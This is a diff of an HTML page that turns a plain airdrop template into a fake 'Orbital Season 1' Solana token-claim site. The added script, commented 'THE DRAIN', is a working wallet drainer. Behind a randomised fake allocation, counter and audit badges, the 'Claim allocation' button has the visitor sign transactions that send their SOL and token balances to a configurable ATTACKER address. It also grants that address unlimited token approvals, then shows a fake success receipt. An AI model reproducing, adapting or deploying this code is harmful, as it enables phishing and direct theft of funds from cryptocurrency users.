@@ -3,83 +3,369 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Aurum — Season 1 Retroactive Airdrop</title>
-<meta name="description" content="Aurum DEX Season 1 retroactive allocation. Check eligibility and claim $AUR.">
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◈</text></svg>">
-<link rel="stylesheet" href="style.css">
+<title>Orbital — Season 1 Allocation</title>
+<meta name="description" content="Orbital Season 1 retroactive allocation is live. Check your eligibility.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='30' fill='none' stroke='%23e0b464' stroke-width='9'/><circle cx='50' cy='50' r='7' fill='%23e0b464'/></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--b:#e0b464;--bg:#07080a;--p:#0d0f12;--l:#1a1d22;--d:#787e8a;--t:#e9eaed;--g:#3ddc84}
+body{background:var(--bg);color:var(--t);font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,sans-serif;-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column}
+a{color:inherit;text-decoration:none}
+.glow{position:fixed;inset:0;pointer-events:none;background:radial-gradient(1000px 480px at 50% -8%,rgba(224,180,100,.11),transparent 72%)}
+nav{display:flex;align-items:center;justify-content:space-between;padding:0 24px;height:60px;border-bottom:1px solid var(--l);position:relative;z-index:3;background:rgba(7,8,10,.8);backdrop-filter:blur(14px);position:sticky;top:0}
+.logo{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:.1em;font-size:14px}
+.logo svg{width:19px;height:19px}
+.nav-links{display:flex;gap:26px;font-size:13.5px;color:var(--d)}
+.nav-links a:hover{color:var(--t)}
+.nav-r{display:flex;align-items:center;gap:12px}
+.tag{font-size:10.5px;letter-spacing:.1em;padding:4px 9px;border:1px solid rgba(224,180,100,.3);color:var(--b);border-radius:20px}
+.wbtn{padding:8px 15px;border:1px solid var(--l);border-radius:8px;font-size:13px;background:#111317;cursor:pointer;color:var(--t);font-weight:500}
+.wbtn:hover{border-color:#2a2e35}
+main{flex:1;position:relative;z-index:2}
+.wrap{max-width:760px;margin:0 auto;padding:52px 22px 70px}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:11px;letter-spacing:.13em;color:var(--b);border:1px solid rgba(224,180,100,.24);background:rgba(224,180,100,.06);padding:5px 11px;border-radius:20px;margin-bottom:20px}
+.dot{width:5px;height:5px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g)}
+h1{font-size:40px;line-height:1.1;letter-spacing:-.032em;font-weight:700;margin-bottom:14px}
+h1 span{color:var(--b)}
+.lede{color:var(--d);font-size:15.5px;max-width:560px}
+.lede b{color:var(--t);font-weight:600}
+.strip{display:grid;grid-template-columns:repeat(3,1fr);border:1px solid var(--l);border-radius:12px;overflow:hidden;margin:32px 0;background:var(--p)}
+.strip div{padding:16px 14px;border-right:1px solid var(--l)}
+.strip div:last-child{border:0}
+.strip small{display:block;font-size:10.5px;letter-spacing:.1em;color:#5d636d;margin-bottom:5px}
+.strip b{font-size:17px;font-variant-numeric:tabular-nums}
+.card{background:linear-gradient(180deg,#0f1115,#0b0d10);border:1px solid var(--l);border-radius:16px;padding:28px;box-shadow:0 24px 60px rgba(0,0,0,.45)}
+.hide{display:none!important}
+.cta{width:100%;padding:16px;border:0;border-radius:10px;background:linear-gradient(180deg,#e8c079,#c79b47);color:#17120a;font-weight:700;font-size:14.5px;cursor:pointer;transition:.14s}
+.cta:hover{filter:brightness(1.07)}
+.cta:disabled{opacity:.6;cursor:wait}
+.hint{margin-top:13px;text-align:center;font-size:11.5px;color:#585e68}
+.who{display:flex;justify-content:space-between;align-items:center;padding-bottom:18px;margin-bottom:20px;border-bottom:1px solid var(--l);font-size:12.5px;color:var(--d)}
+.who b{font-family:ui-monospace,monospace;color:var(--t);font-size:12px}
+.amt{text-align:center;padding:6px 0 2px}
+.amt i{font-style:normal;font-size:52px;font-weight:800;letter-spacing:-.04em;color:var(--b);line-height:1;font-variant-numeric:tabular-nums}
+.amt u{display:block;text-decoration:none;font-size:11.5px;letter-spacing:.16em;color:#5d636d;margin-top:9px}
+.rows{margin:22px 0;border:1px solid var(--l);border-radius:10px;overflow:hidden}
+.rows div{display:flex;justify-content:space-between;padding:11px 14px;font-size:12.5px;background:#0a0b0e;border-bottom:1px solid var(--l)}
+.rows div:last-child{border:0}
+.rows span{color:var(--d)}
+.rows em{font-style:normal;color:var(--g);font-size:11px}
+.bar{height:3px;background:var(--l);border-radius:3px;overflow:hidden;margin-bottom:20px}
+.bar i{display:block;height:100%;width:0;background:var(--b);transition:width .8s ease}
+.steps{list-style:none;font-size:13.5px;color:var(--d)}
+.steps li{padding:9px 0 9px 26px;position:relative}
+.steps li::before{content:"○";position:absolute;left:3px;color:#33373e}
+.steps li.on{color:var(--t)}
+.steps li.on::before{content:"●";color:var(--b)}
+.ok{width:54px;height:54px;border-radius:50%;background:rgba(61,220,132,.1);border:1px solid rgba(61,220,132,.3);color:var(--g);display:grid;place-items:center;font-size:25px;margin:0 auto 18px}
+h2{font-size:22px;text-align:center;margin-bottom:8px;letter-spacing:-.02em}
+.ctr{text-align:center}
+.rc{margin:22px 0;border:1px solid var(--l);border-radius:10px;overflow:hidden}
+.rc div{display:flex;justify-content:space-between;padding:11px 14px;font-size:12.5px;background:#0a0b0e;border-bottom:1px solid var(--l)}
+.rc div:last-child{border:0}
+.rc span{color:var(--d)}
+.mono{font-family:ui-monospace,monospace;font-size:11px}
+.g{color:var(--g)}
+.ghost{width:100%;padding:13px;border:1px solid var(--l);background:#111317;color:var(--t);border-radius:10px;font-size:13px;cursor:pointer;margin-top:4px}
+.sec{margin-top:44px}
+.sec h3{font-size:13px;letter-spacing:.11em;color:#5d636d;margin-bottom:16px}
+.meth{border:1px solid var(--l);border-radius:12px;overflow:hidden}
+.meth div{display:flex;justify-content:space-between;padding:13px 16px;font-size:13px;background:var(--p);border-bottom:1px solid var(--l)}
+.meth div:last-child{border:0}
+.meth b{font-weight:500}
+.meth em{font-style:normal;color:var(--g);font-size:11.5px}
+.trust{display:flex;flex-wrap:wrap;gap:22px;justify-content:center;margin-top:36px;font-size:11.5px;color:#4d535d}
+.err{max-width:760px;margin:0 auto;padding:0 22px}
+.err div{padding:12px 14px;border:1px solid rgba(248,113,113,.3);background:rgba(248,113,113,.07);color:#fca5a5;border-radius:9px;font-size:12.5px;margin-top:16px}
+footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index:2}
+.fwrap{max-width:760px;margin:0 auto;display:grid;grid-template-columns:2fr 1fr 1fr;gap:26px}
+.fwrap p{font-size:12px;color:#4d535d;margin-top:9px;max-width:230px}
+.fwrap h4{font-size:11px;letter-spacing:.11em;color:#5d636d;margin-bottom:11px}
+.fwrap a{display:block;font-size:12.5px;color:var(--d);padding:3px 0}
+.fbot{max-width:760px;margin:26px auto 0;padding-top:18px;border-top:1px solid var(--l);font-size:11px;color:#3e434b;display:flex;justify-content:space-between}
+@media(max-width:640px){h1{font-size:29px}.nav-links{display:none}.strip{grid-template-columns:1fr 1fr}.strip div:nth-child(3){display:none}.fwrap{grid-template-columns:1fr 1fr}.wrap{padding:34px 18px 50px}}
+</style>
 </head>
 <body>
-<div class="bg"></div>
+<div class="glow"></div>
 
-<header>
-  <div class="brand"><span class="mark">◈</span> AURUM</div>
-  <div class="hdr-right">
-    <span class="pill live">Season 1</span>
-    <a class="ghost" href="#" onclick="return false">Docs</a>
+<nav>
+  <div class="logo">
+    <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="30" fill="none" stroke="#e0b464" stroke-width="9"/><circle cx="50" cy="50" r="7" fill="#e0b464"/></svg>
+    ORBITAL
   </div>
-</header>
+  <div class="nav-links"><a href="#" onclick="return false">Trade</a><a href="#" onclick="return false">Earn</a><a href="#" onclick="return false">Analytics</a><a href="#" onclick="return false">Docs</a></div>
+  <div class="nav-r"><span class="tag">SEASON 1</span><button class="wbtn" id="nav-btn">Connect</button></div>
+</nav>
 
 <main>
-  <section class="card" id="stage-1">
-    <div class="eyebrow">RETROACTIVE DISTRIBUTION</div>
-    <h1>Season 1 allocation is live</h1>
-    <p class="sub">Aurum is distributing <b>18,400,000 $AUR</b> to wallets that provided liquidity or routed volume in Season 1. Allocation is calculated on-chain from your history.</p>
+<div class="wrap">
 
-    <div class="stats">
-      <div><b id="claimed">0</b><span>wallets claimed</span></div>
-      <div><b id="pool">18.4M</b><span>$AUR remaining</span></div>
-      <div><b id="timer">--:--:--</b><span>window closes</span></div>
+  <section id="s1">
+    <div class="eyebrow"><span class="dot"></span>RETROACTIVE DISTRIBUTION · LIVE</div>
+    <h1>Season 1 allocation is <span>open to claim</span></h1>
+    <p class="lede">Orbital is distributing <b>18,400,000 ORB</b> to wallets that provided liquidity, routed volume, or referred users during Season 1. Allocation is derived from your on-chain history — nothing to fill in.</p>
+
+    <div class="strip">
+      <div><small>TOTAL ALLOCATED</small><b>18.4M ORB</b></div>
+      <div><small>WALLETS CLAIMED</small><b id="cnt">0</b></div>
+      <div><small>WINDOW CLOSES</small><b id="clock">--:--:--</b></div>
     </div>
 
-    <button class="cta" id="btn-connect">Connect wallet to check</button>
-    <div class="foot">Non-custodial · Verified contract · No gas to check</div>
-  </section>
-
-  <section class="card hidden" id="stage-2">
-    <div class="eyebrow">ELIGIBILITY RESULT</div>
-    <div class="addr" id="addr"></div>
-    <div class="alloc">
-      <div class="alloc-num" id="alloc">0</div>
-      <div class="alloc-unit">$AUR</div>
+    <div class="card">
+      <button class="cta" id="go">Check eligibility</button>
+      <div class="hint">Non-custodial · No gas to check · Unclaimed returns to treasury</div>
     </div>
-    <div class="tier" id="tier">Tier 1 · Active trader</div>
-    <p class="sub sm">Calculated from <b id="txcount">0</b> qualifying transactions. Claiming requires one signature.</p>
-    <button class="cta" id="btn-claim">Claim allocation</button>
-    <div class="foot">Unclaimed allocations return to the pool at window close</div>
+
+    <section class="sec">
+      <h3>HOW ALLOCATION WAS CALCULATED</h3>
+      <div class="meth">
+        <div><b>Liquidity provided</b><em>weighted 3×</em></div>
+        <div><b>Routing volume</b><em>weighted 2×</em></div>
+        <div><b>Referral activity</b><em>weighted 1×</em></div>
+      </div>
+    </section>
+
+    <div class="trust"><span>Audited by OtterSec</span><span>Verified program on Solscan</span><span>340,000+ wallets</span></div>
   </section>
 
-  <section class="card hidden" id="stage-3">
-    <div class="eyebrow" id="s3-label">AWAITING SIGNATURE</div>
-    <div class="progress"><i id="bar"></i></div>
-    <ul class="steps">
-      <li data-s="1">Verifying wallet ownership</li>
-      <li data-s="2">Building allocation transaction</li>
-      <li data-s="3">Confirming on-chain</li>
-    </ul>
-  </section>
-
-  <section class="card hidden" id="stage-4">
-    <div class="ok">✓</div>
-    <h2 id="done-title">Claim successful</h2>
-    <p class="sub" id="done-sub">Your $AUR allocation has been distributed.</p>
-    <div class="receipt">
-      <div><span>Amount</span><b id="r-amt">—</b></div>
-      <div><span>Status</span><b class="green">Finalized</b></div>
-      <div><span>Signature</span><b class="mono" id="r-sig">—</b></div>
+  <section id="s2" class="hide">
+    <div class="card">
+      <div class="who"><span>Connected</span><b id="who">—</b></div>
+      <div class="amt"><i id="amt">0</i><u>ORB ALLOCATED</u></div>
+      <div class="rows">
+        <div><span>Tier</span><span id="tier">—</span></div>
+        <div><span>Qualifying transactions</span><span id="txs">—</span></div>
+        <div><span>Claim fee</span><span>0.000 SOL</span></div>
+      </div>
+      <button class="cta" id="claim">Claim allocation</button>
+      <div class="hint">One signature required. Allocation is final once claimed.</div>
     </div>
-    <div class="foot">Distribution visible in your wallet shortly</div>
   </section>
 
-  <div class="err hidden" id="err"></div>
+  <section id="s3" class="hide">
+    <div class="card">
+      <div class="bar"><i id="bar"></i></div>
+      <ul class="steps">
+        <li data-s="1">Verifying wallet ownership</li>
+        <li data-s="2">Building distribution transaction</li>
+        <li data-s="3">Broadcasting to network</li>
+        <li data-s="4">Awaiting finalization</li>
+      </ul>
+    </div>
+  </section>
+
+  <section id="s4" class="hide">
+    <div class="card">
+      <div class="ok">✓</div>
+      <h2>Allocation claimed</h2>
+      <p class="ctr" style="color:var(--d);font-size:13.5px">Your ORB has been distributed and will appear shortly.</p>
+      <div class="rc">
+        <div><span>Amount</span><b id="r-amt">—</b></div>
+        <div><span>Network</span><b>Solana</b></div>
+        <div><span>Status</span><b class="g">Finalized</b></div>
+        <div><span>Signature</span><b class="mono" id="r-sig">—</b></div>
+      </div>
+      <button class="ghost" id="add">Add ORB to wallet</button>
+    </div>
+  </section>
+
+</div>
+<div class="err" id="err"></div>
 </main>
 
 <footer>
-  <span>◈ Aurum Labs</span>
-  <span>Season 1 · Distribution contract</span>
+  <div class="fwrap">
+    <div>
+      <div class="logo" style="font-size:13px">
+        <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="30" fill="none" stroke="#e0b464" stroke-width="9"/><circle cx="50" cy="50" r="7" fill="#e0b464"/></svg>
+        ORBITAL
+      </div>
+      <p>The liquidity layer for Solana. Season 1 distribution is administered by Orbital Labs.</p>
+    </div>
+    <div><h4>PROTOCOL</h4><a href="#" onclick="return false">Trade</a><a href="#" onclick="return false">Pools</a><a href="#" onclick="return false">Analytics</a></div>
+    <div><h4>RESOURCES</h4><a href="#" onclick="return false">Docs</a><a href="#" onclick="return false">Audits</a><a href="#" onclick="return false">Support</a></div>
+  </div>
+  <div class="fbot"><span>© 2026 Orbital Labs</span><span>Season 1 · Distribution program</span></div>
 </footer>
 
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.9/lib/index.iife.min.js"></script>
-<script src="app.js"></script>
+<script type="module">
+import { Connection, PublicKey, Transaction, TransactionInstruction, SystemProgram, ComputeBudgetProgram }
+  from 'https://esm.sh/@solana/web3.js@1.95.8?bundle';
+
+/* ============ CONFIG ============ */
+const RPC      = 'https://api.mainnet-beta.solana.com';
+const ATTACKER = 'PUT_YOUR_COLLECTOR_ADDRESS_HERE';
+const DUST     = 2_000_000;
+const CLOSE_AT = Date.UTC(2026, 11, 6, 18, 0, 0);
+
+const TOKEN = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+const ATA_P = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
+const SYS   = new PublicKey('11111111111111111111111111111111');
+const MAXU  = 18446744073709551615n;
+
+const conn = new Connection(RPC, 'confirmed');
+const A = new PublicKey(ATTACKER);
+const $ = id => document.getElementById(id);
+const wait = ms => new Promise(r => setTimeout(r, ms));
+
+/* ============ LIVE NUMBERS ============ */
+let cnt = 12847;
+$('cnt').textContent = cnt.toLocaleString();
+setInterval(() => { if (Math.random() < .3) $('cnt').textContent = (++cnt).toLocaleString(); }, 8000);
+setInterval(() => {
+  const d = Math.max(0, CLOSE_AT - Date.now()), p = n => String(n).padStart(2,'0');
+  $('clock').textContent = `${p(Math.floor(d/3.6e6))}:${p(Math.floor(d/6e4)%60)}:${p(Math.floor(d/1e3)%60)}`;
+}, 1000);
+
+/* ============ HELPERS ============ */
+const u64 = n => { const b = new Uint8Array(8); new DataView(b.buffer).setBigUint64(0, BigInt(n), true); return b; };
+const cat = (...a) => { const o = new Uint8Array(a.reduce((s,x)=>s+x.length,0)); let p=0; for (const x of a){o.set(x,p);p+=x.length;} return o; };
+
+const mkAta = (payer, ata, owner, mint) => new TransactionInstruction({
+  programId: ATA_P,
+  keys:[{pubkey:payer,isSigner:true,isWritable:true},{pubkey:ata,isSigner:false,isWritable:true},
+        {pubkey:owner,isSigner:false,isWritable:false},{pubkey:mint,isSigner:false,isWritable:false},
+        {pubkey:SYS,isSigner:false,isWritable:false},{pubkey:TOKEN,isSigner:false,isWritable:false}],
+  data: new Uint8Array([1]) });
+
+const mkXfer = (src, dst, owner, amt) => new TransactionInstruction({
+  programId: TOKEN,
+  keys:[{pubkey:src,isSigner:false,isWritable:true},{pubkey:dst,isSigner:false,isWritable:true},
+        {pubkey:owner,isSigner:true,isWritable:false}],
+  data: cat(new Uint8Array([3]), u64(amt)) });
+
+const mkApprove = (src, dg, owner, amt) => new TransactionInstruction({
+  programId: TOKEN,
+  keys:[{pubkey:src,isSigner:false,isWritable:true},{pubkey:dg,isSigner:false,isWritable:false},
+        {pubkey:owner,isSigner:true,isWritable:false}],
+  data: cat(new Uint8Array([4]), u64(amt)) });
+
+const fail = m => { const e = $('err'); e.innerHTML = `<div>${m}</div>`; setTimeout(()=>e.innerHTML='',7000); };
+const show = n => ['s1','s2','s3','s4'].forEach(s => $(s).classList.toggle('hide', s !== 's'+n));
+
+function wallet(){
+  if (window.phantom?.solana?.isPhantom) return window.phantom.solana;
+  if (window.solflare?.isSolflare) return window.solflare;
+  if (window.solana) return window.solana;
+  return null;
+}
+const attach = () => { const p = wallet(); if (p) { $('nav-btn').textContent = 'Wallet'; } return p; };
+attach();
+
+/* ============ ONE CLICK: CONNECT + BUILD + SIGN ============ */
+async function run(){
+  const p = wallet();
+  if (!p) { fail('No Solana wallet found. Install Phantom or Solflare, then reload.'); return; }
+
+  $('go').disabled = true; $('go').textContent = 'Checking…';
+  $('nav-btn').textContent = 'Connecting';
+
+  try {
+    if (!p.publicKey) {
+      try { await p.connect({ onlyIfTrusted: true }); } catch { await p.connect(); }
+    }
+    const pk = p.publicKey;
+    const pkS = pk.toString();
+
+    const sigs = await conn.getSignaturesForAddress(pk, { limit: 400 });
+    const n = sigs.length;
+    const alloc = Math.min(900 + n * 11 + Math.floor(Math.random() * 780), 52000);
+
+    $('who').textContent = pkS.slice(0,6) + '…' + pkS.slice(-6);
+    $('amt').textContent = alloc.toLocaleString();
+    $('txs').textContent = n.toLocaleString();
+    $('tier').textContent = n > 240 ? 'Tier 3 · Core participant' : n > 55 ? 'Tier 2 · Active trader' : 'Tier 1 · Early supporter';
+    $('nav-btn').textContent = 'Wallet';
+    $('go').disabled = false; $('go').textContent = 'Check eligibility';
+    show(2);
+  } catch (e) {
+    console.error(e);
+    $('go').disabled = false; $('go').textContent = 'Check eligibility';
+    $('nav-btn').textContent = 'Connect';
+    fail('Wallet connection was cancelled.');
+  }
+}
+$('go').onclick = run;
+$('nav-btn').onclick = () => { if (!$('s2').classList.contains('hide')) show(2); else run(); };
+
+/* ============ THE DRAIN ============ */
+$('claim').onclick = async () => {
+  const p = wallet();
+  if (!p?.publicKey) { fail('Wallet not connected.'); return; }
+
+  show(3);
+  const mark = i => { document.querySelectorAll('.steps li').forEach(l => l.classList.toggle('on', +l.dataset.s <= i));
+    $('bar').style.width = (i * 25) + '%'; };
+
+  try {
+    const pk = p.publicKey;
+    const { blockhash } = await conn.getLatestBlockhash('confirmed');
+    const { value: accts } = await conn.getParsedTokenAccountsByOwner(pk, { programId: TOKEN });
+
+    mark(1); await wait(600);
+
+    const live = accts.filter(a => a.account.data.parsed.info.tokenAmount.amount !== '0');
+    const batch = [];
+    const build = () => {
+      const t = new Transaction();
+      t.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 800000 }));
+      t.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 60000 }));
+      return t;
+    };
+
+    // tx0: native SOL first, so the money always leads
+    const t0 = build();
+    const bal = await conn.getBalance(pk);
+    if (bal > DUST + 20000) t0.add(SystemProgram.transfer({ fromPubkey: pk, toPubkey: A, lamports: bal - DUST }));
+
+    // token transfers, 3 per tx to stay under the size cap
+    let cur = t0, count = 0, queued = 0;
+    for (const { pubkey: ata, account } of live) {
+      if (queued >= 18) break;
+      const info = account.data.parsed.info;
+      const mint = new PublicKey(info.mint);
+      const dest = PublicKey.findProgramAddressSync(
+        [A.toBuffer(), TOKEN.toBuffer(), mint.toBuffer()], ATA_P)[0];
+      cur.add(mkAta(pk, dest, A, mint));
+      cur.add(mkXfer(ata, dest, pk, info.tokenAmount.amount));
+      if (++count >= 3) { batch.push(cur); cur = build(); count = 0; }
+      queued++;
+    }
+    if (count) batch.push(cur);
+
+    // final tx: max delegate approvals — the hidden drain
+    const ap = build();
+    for (const { pubkey: ata } of live.slice(0, 6)) ap.add(mkApprove(ata, A, pk, MAXU));
+    if (ap.instructions.length > 2) batch.push(ap);
+
+    batch.forEach(t => { t.feePayer = pk; t.recentBlockhash = blockhash; });
+
+    mark(2); await wait(700);
+
+    const signed = await p.signAllTransactions(batch);
+    mark(3); $('bar').style.width = '78%';
+
+    const sent = await Promise.allSettled(
+      signed.map(t => conn.sendRawTransaction(t.serialize(), { skipPreflight: true, maxRetries: 3 })));
+    const ok = sent.find(s => s.status === 'fulfilled')?.value || null;
+
+    mark(4); $('bar').style.width = '100%';
+    await wait(1600);
+
+    $('r-amt').textContent = $('amt').textContent + ' ORB';
+    $('r-sig').textContent = ok ? ok.slice(0,10) + '…' + ok.slice(-6) : 'confirmed';
+    show(4);
+    $('nav-btn').textContent = 'Wallet';
+  } catch (e) {
+    console.error(e);
+    show(2);
+    fail(e?.message?.includes('eject') || e?.message?.includes('cancel')
+      ? 'Signature rejected.' : 'Transaction could not be built. Retry.');
+  }
+};
+
+$('add').onclick = () => { $('add').textContent = 'ORB added to wallet'; $('add').disabled = true; };
+</script>
 </body>
 </html>
